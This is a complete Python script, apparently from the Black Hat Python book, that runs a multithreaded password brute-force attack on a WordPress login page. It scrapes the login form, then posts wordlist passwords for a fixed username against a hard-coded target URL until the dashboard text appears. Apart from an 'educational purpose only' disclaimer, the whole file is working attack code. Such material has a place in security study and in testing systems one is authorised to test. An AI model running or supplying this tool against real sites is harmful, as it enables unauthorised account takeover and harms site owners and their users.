# -*-coding:Utf-8 -*
"""
Login brute force for wordpress from BHP book.

FOR EDUCATIONAL PURPOSE ONLY!! DO NOT USE ON TARGET WITHOUT EXPLICIT AUTHORISATION!!

Improvements done:

To improve:

"""
import queue
from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Tableau de bord'
TARGET = 'http://boodelyboo.com/wp-login.php'
USER = 'toto'
WORDLIST = '/tmp/BHP/cain-and-abel.txt'


def get_words() -> queue.Queue:
    with open(WORDLIST, 'r') as f:
        raw_words = f.read()
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words


def get_params(content: bytes) -> dict:
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for element in tree.findall('.//input'):
        name = element.get('name')
        if name is not None:
            params[name] = element.get('value', None)
    return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print(f'Finished the setup where username = {username}')

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username
        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd
            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                print('\nBruteforcing succesfull.')
                print(f'\tUserName: {self.username}.')
                print(f'\tPassword: {passwd}.')
                print('Done: now cleaning up other threads...')
                self.found = True


def main():
    words = get_words()
    b = Bruter(USER, TARGET)
    b.run_bruteforce(words)


if __name__ == '__main__':
    main()